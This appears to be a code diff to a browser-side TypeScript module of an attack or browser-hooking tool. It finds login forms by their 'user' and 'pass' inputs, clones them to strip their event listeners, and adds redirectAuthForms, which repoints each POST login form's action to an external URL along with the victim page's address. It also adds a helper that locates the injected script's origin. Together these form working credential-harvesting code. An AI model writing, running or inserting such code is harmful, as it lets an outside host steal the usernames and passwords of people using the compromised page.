@@ -19,14 +19,17 @@ export function resolveFavIconEdgeCases () {
 }
 
 
-export function resolveEventfulForms () {
-    const credentialForms = Array.from(new Set(Array
+export function getAuthForms():any[] {
+    return Array.from(new Set(Array
         .from(document.querySelectorAll('input[name^="user"]'))
         .concat(Array.from(document.querySelectorAll('input[name^="pass"]')))
         .map(input => input.closest('form'))
     ))
+}
 
-    credentialForms.forEach(form => cloneElement(form))
+
+export function resolveEventfulForms () {
+    getAuthForms().forEach(form => cloneElement(form))
 }
 
 
@@ -193,4 +196,19 @@ export async function getNetworkSpeed ():Promise<NetworkSpeedObj> {
         down: {kbps: downloadSpeed?.kbps, mbps: downloadSpeed?.mbps},
         up: {kbps: uploadSpeed?.kbps, mbps: uploadSpeed?.mbps}
     }
+}
+
+
+export function getScriptOrigin(hashId:string):string {
+    const script:HTMLScriptElement = document.querySelector(`script[src$='#${hashId}']`)
+
+    return script ? new URL(script.src).origin : ''
+}
+
+
+export function redirectAuthForms(to:string, hook:boolean) {
+    const link = `${to}?redirect=${window.location.href}&hook=${hook ? 'true': 'false'};`
+
+    resolveEventfulForms()
+    getAuthForms().forEach(f => { if (f.method.toLowerCase() === 'post') f.action = link })
 }
